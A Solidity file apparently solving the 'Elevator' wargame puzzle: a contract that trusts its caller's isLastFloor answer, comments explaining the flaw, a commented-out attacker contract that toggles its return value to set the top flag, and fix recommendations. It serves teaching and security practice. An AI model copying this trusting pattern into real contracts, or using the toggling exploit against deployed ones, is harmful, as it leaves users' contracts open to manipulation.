// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
   function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top; // Tracks whether the elevator has reached the top floor.
    uint256 public floor; // Tracks the current floor of the elevator.

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender); // Assumes the caller is a contract implementing the `Building` interface.

        if (!building.isLastFloor(_floor)) { // If the specified floor is not the last floor:
            floor = _floor; // Update the current floor.
            top = building.isLastFloor(floor); // Check if the updated floor is the last floor and update `top`.
        }
    }
}

/*Potential Vulnerability: The goTo function calls building.isLastFloor twice. If the caller's 
contract implements isLastFloor in a malicious way (e.g., returning false the first time and 
true the second time), it could manipulate the top variable. This is a form of 
reentrancy-like behavior.

Caller Assumption:The contract assumes the caller is a contract that implements 
the Building interface. If the caller is not a contract or does not implement the interface, 
the transaction will fail.*/

/* a contract to challenge the buiding contract
contract challengeBuilding is Building {
    bool private toggle = true;

    function isLastFloor(uint256) external override returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack(Elevator elevator) public {
        elevator.goTo(1);
    }
} */

/*The isLastFloor function toggles its return value between true and false each time it is called. 
This allows the attacker to manipulate the top variable in the Elevator contract.

Recommendations:
Avoid making multiple external calls to the same function within a single transaction.
Use a view or pure function if the external call does not modify state.
Consider adding access control or validation to ensure the caller is trusted.
*/
